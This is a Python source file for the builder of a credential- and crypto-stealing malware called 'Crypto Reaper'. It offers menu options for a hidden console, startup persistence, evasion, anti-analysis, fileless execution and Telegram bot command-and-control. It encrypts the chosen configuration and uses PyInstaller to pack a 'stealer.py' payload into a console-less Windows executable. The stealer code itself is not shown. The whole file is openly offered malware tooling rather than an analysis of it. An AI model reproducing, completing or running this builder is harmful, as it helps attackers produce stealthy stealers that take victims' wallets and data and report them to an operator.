import os
import json
import PyInstaller.__main__
from cryptography.fernet import Fernet

class CryptoReaperBuilder:
    def __init__(self):
        self.options = {
            "hidden_console": True,
            "startup_persistence": False,
            "evasion_techniques": True,
            "telegram_c2": "",
            "anti_analysis": True,
            "fileless_execution": False
        }
        
    def show_banner(self):
        print("""
        Crypto Reaper - By Noir.
        """)
    
    def build_menu(self):
        print("\n[+] Build Configuration:")
        print("1. Hidden Console: " + ("✅" if self.options["hidden_console"] else "❌"))
        print("2. Startup Persistence: " + ("✅" if self.options["startup_persistence"] else "❌"))
        print("3. Evasion Techniques: " + ("✅" if self.options["evasion_techniques"] else "❌"))
        print("4. Anti-Analysis: " + ("✅" if self.options["anti_analysis"] else "❌"))
        print("5. Fileless Execution: " + ("✅" if self.options["fileless_execution"] else "❌"))
        print("6. Telegram C2: " + (self.options["telegram_c2"] if self.options["telegram_c2"] else "Not Set"))
        print("7. BUILD EXECUTABLE")
        print("8. Exit")
        
        choice = input("\nSelect option: ")
        return choice
    
    def configure_telegram(self):
        token = input("Enter Telegram Bot Token: ")
        chat_id = input("Enter Chat ID: ")
        self.options["telegram_c2"] = f"{token}:{chat_id}"
    
    def toggle_option(self, option):
        self.options[option] = not self.options[option]
        print(f"{option} {'ENABLED' if self.options[option] else 'DISABLED'}")
    
    def generate_config(self):
        config = {
            "hidden": self.options["hidden_console"],
            "persistence": self.options["startup_persistence"],
            "evasion": self.options["evasion_techniques"],
            "anti_analysis": self.options["anti_analysis"],
            "fileless": self.options["fileless_execution"],
            "telegram": self.options["telegram_c2"]
        }
        key = Fernet.generate_key()
        cipher = Fernet(key)
        encrypted_config = cipher.encrypt(json.dumps(config).encode())
        
        with open("core/config_encrypted.bin", "wb") as f:
            f.write(encrypted_config)
        with open("core/key.bin", "wb") as f:
            f.write(key)
    
    def build_executable(self):
        print("\n[+] Building Crypto Reaper...")
        
        self.generate_config()
        
        pyinstaller_args = [
            'core/stealer.py',
            '--onefile',
            '--name=CryptoReaper',
            '--distpath=./dist',
            '--workpath=./build',
            '--specpath=./',
            '--add-data=core;core',
            '--noconfirm',
            '--clean'
        ]
        
        if self.options["hidden_console"]:
            pyinstaller_args.append('--windowed')
            pyinstaller_args.append('--noconsole')
        if os.path.exists("icon.ico"):
            pyinstaller_args.append('--icon=icon.ico')
        
        PyInstaller.__main__.run(pyinstaller_args)
        print("\n[+] Build Complete! Check ./dist/CryptoReaper.exe")
    
    def run(self):
        self.show_banner()
        
        while True:
            choice = self.build_menu()
            
            if choice == "1":
                self.toggle_option("hidden_console")
            elif choice == "2":
                self.toggle_option("startup_persistence")
            elif choice == "3":
                self.toggle_option("evasion_techniques")
            elif choice == "4":
                self.toggle_option("anti_analysis")
            elif choice == "5":
                self.toggle_option("fileless_execution")
            elif choice == "6":
                self.configure_telegram()
            elif choice == "7":
                if not self.options["telegram_c2"]:
                    print("\n[-] Please configure Telegram C2 first!")
                    continue
                self.build_executable()
                break
            elif choice == "8":
                print("\n[-] Exiting...")
                break
            else:
                print("\n[-] Invalid option!")

if __name__ == "__main__":
    builder = CryptoReaperBuilder()
    builder.run()